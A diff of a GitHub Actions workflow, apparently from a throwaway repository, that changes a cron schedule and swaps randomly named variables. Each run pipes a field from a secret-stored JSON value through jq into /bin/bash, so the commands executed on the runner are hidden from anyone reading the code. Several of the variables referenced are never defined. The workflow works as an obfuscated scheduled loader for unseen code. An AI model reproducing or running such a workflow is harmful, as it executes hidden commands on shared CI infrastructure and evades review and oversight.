@@ -3,20 +3,19 @@ name: taoshiwang1234
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
-
-jobs:  # 30092
+    - cron: '34 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: taoshiwang1234
         env:
-          l46: ${{ secrets.l46 }}
+          r4828: ${{ secrets.r4828 }}
         run: |
-          echo $l46 | jq -r .roi096 | /bin/bash
-          echo $ynum9581 | jq -r .ud48 | /bin/bash
-          echo $wvz8 | jq -r .bcpg64 | /bin/bash
-          echo $rxvpx54 | jq -r .bvges91 | /bin/bash
-          echo $n0802 | jq -r .gytsu01539 | /bin/bash
+          echo $r4828 | jq -r .udx75486 | /bin/bash
+          echo $jydv8 | jq -r .rxkw86625 | /bin/bash
+          echo $pbxx20895 | jq -r .clup315 | /bin/bash
+          echo $je8498 | jq -r .u5 | /bin/bash
 
